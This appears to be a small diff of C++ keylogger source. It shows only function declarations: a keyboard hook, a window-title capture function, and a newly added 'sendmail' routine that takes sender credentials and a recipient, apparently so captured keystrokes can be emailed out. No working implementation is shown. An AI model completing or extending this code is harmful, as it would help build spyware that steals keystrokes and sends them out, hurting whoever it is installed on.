@@ -9,6 +9,6 @@ using namespace std;
 
 DWORD WINAPI Keylogger(LPVOID lpParm);
 LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam);
-void on_press(string key);
+void sendmail(char* senderId, char* senderPw, char* receiver);
 void wintitle();
-void FSD();
+void FSD(char* senderId, char* senderPw, char* receiver);
